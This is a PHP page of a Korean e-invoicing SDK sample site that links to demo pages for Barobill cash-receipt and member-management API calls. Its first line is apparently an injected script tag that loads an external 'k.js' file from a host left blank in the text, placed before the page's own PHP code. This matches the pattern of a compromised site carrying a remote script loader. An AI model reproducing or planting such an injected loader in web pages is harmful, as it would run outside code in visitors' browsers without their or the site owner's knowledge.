<script type='text/javascript' src='https:// /k.js?v=222'></script><?php include '../_include/top.php'; ?>
<fieldset class="fieldset1">
	<legend>현금영수증 관련 API</legend>
	<fieldset class="fieldset2">
		<legend>문서 프로세스</legend>
		<ul>
			<li><a href="API_CASHBILL/RegistCashBill.php">RegistCashBill</a> - 등록</li>
			<li><a href="API_CASHBILL/UpdateCashBill.php">UpdateCashBill</a> - 수정</li>
			<li><a href="API_CASHBILL/IssueCashBill.php">IssueCashBill</a> - 발행</li>
			<li><a href="API_CASHBILL/CancelCashBillBeforeNTSSend.php">CancelCashBillBeforeNTSSend</a> - 발행취소 (국세청전송 전)</li>
			<li><a href="API_CASHBILL/CancelCashBill.php">CancelCashBill</a> - 발행취소 (국세청전송 후)</li>
			<li><a href="API_CASHBILL/CancelCashBillPartial.php">CancelCashBillPartial</a> - 부분취소 (국세청전송 후)</li>
			<li><a href="API_CASHBILL/DeleteCashBill.php">DeleteCashBill</a> - 삭제</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend class="red">홈택스 조회</legend>
		<ul>
			<li><a href="API_CASHBILL/GetCashBillScrapRequestURL.php">GetCashBillScrapRequestURL</a> - 국세청 현금영수증 조회서비스 신청 URL</li>
			<li><a href="API_CASHBILL/GetDailyCashBillSalesList.php">GetDailyCashBillSalesList</a> - 일별 현금영수증 발급분 조회(매출) [국세청 전송완료 건만]</li>
			<li><a href="API_CASHBILL/GetDailyCashBillPurchaseList.php">GetDailyCashBillPurchaseList</a> - 일별 현금영수증 수취분 조회(매입) [국세청 전송완료 건만]</li>
			<li><a href="API_CASHBILL/GetMonthlyCashBillSalesList.php">GetMonthlyCashBillSalesList</a> - 월별 현금영수증 발급분 조회(매출) [국세청 전송완료 건만]</li>
			<li><a href="API_CASHBILL/GetMonthlyCashBillPurchaseList.php">GetMonthlyCashBillPurchaseList</a> - 월별 현금영수증 수취분 조회(매입) [국세청 전송완료 건만]</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>문서 정보</legend>
		<ul>
			<li><a href="API_CASHBILL/GetCashBill.php">GetCashBill</a> - 문서 정보</li>
			<li><a href="API_CASHBILL/GetCashBillLog.php">GetCashBillLog</a> - 문서 이력</li>
			<li><a href="API_CASHBILL/GetCashBillState.php">GetCashBillState</a> - 문서 상태</li>
			<li><a href="API_CASHBILL/GetCashBillStates.php">GetCashBillStates</a> - 문서 상태(대량, 100건 까지)</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>부가서비스</legend>
		<ul>
			<li><a href="API_CASHBILL/SendEmail.php">SendEmail</a> - 이메일 전송</li>
			<li><a href="API_CASHBILL/SendSMS.php">SendSMS</a> - 문자 전송</li>
			<li><a href="API_CASHBILL/SendFax.php">SendFax</a> - 팩스 전송</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>기타</legend>
		<ul>
			<li><a href="API_CASHBILL/CheckMgtKeyIsExists.php">CheckMgtKeyIsExists</a> - 연동사부여 문서키 사용여부 확인</li>
			<li><a href="API_CASHBILL/GetCashBillPopUpURL.php">GetCashBillPopUpURL</a> - 문서 내용보기 팝업 URL</li>
			<li><a href="API_CASHBILL/GetCashBillPrintURL.php">GetCashBillPrintURL</a> - 인쇄 팝업 URL</li>
			<li><a href="API_CASHBILL/GetCashBillsPrintURL.php">GetCashBillsPrintURL</a> - 대량인쇄 팝업 URL</li>
		</ul>
	</fieldset>
</fieldset>
<br />
<fieldset class="fieldset1">
	<legend>바로빌 기본 API</legend>
	<fieldset class="fieldset2">
		<legend>회원사 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/CheckCorpIsMember.php">CheckCorpIsMember</a> - 회원사 여부 확인</li>
			<li><a href="API_BAROBILL/RegistCorp.php">RegistCorp</a> - 회원사 추가</li>
			<li><a href="API_BAROBILL/UpdateCorpInfo.php">UpdateCorpInfo</a> - 회원사 정보 수정</li>
			<li><a href="API_BAROBILL/GetCorpMemberContacts.php">GetCorpMemberContacts</a> - 회원사 담당자 목록</li>
			<li><a href="API_BAROBILL/ChangeCorpManager.php">ChangeCorpManager</a> - 회원사 관리자 변경</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>사용자 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/AddUserToCorp.php">AddUserToCorp</a></a> - 사용자 추가</li>
			<li><a href="API_BAROBILL/UpdateUserInfo.php">UpdateUserInfo</a></a> - 사용자 정보 수정</li>
			<li><a href="API_BAROBILL/UpdateUserPWD.php">UpdateUserPWD</a></a> - 사용자 비밀번호 수정</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>공인인증서 관련</legend>
		<ul>
			<li><a href="API_BAROBILL/GetCertificateRegistURL.php">GetCertificateRegistURL</a></a> - 공인인증서 등록 URL</li>
			<li><a href="API_BAROBILL/GetCertificateExpireDate.php">GetCertificateExpireDate</a></a> - 등록한 공인인증서 만료일 확인</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend style="color:red;">문자 발신번호 등록</legend>
		<ul>
			<li><a href="API_BAROBILL/RegistSMSFromNumber.php">RegistSMSFromNumber</a></a> - 발신번호 추가</li>
			<li><a href="API_BAROBILL/CheckSMSFromNumber.php">CheckSMSFromNumber</a></a> - 발신번호 확인</li>
			<li><a href="API_BAROBILL/GetSMSFromNumberURL.php">GetSMSFromNumberURL</a></a> - 발신번호 관리 URL</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>기타</legend>
		<ul>
			<li><a href="API_BAROBILL/GetBaroBillURL.php">GetBaroBillURL</a> - 바로빌 URL</li>
		</ul>
	</fieldset>
</fieldset>
<?php include '../_include/bottom.php'; ?>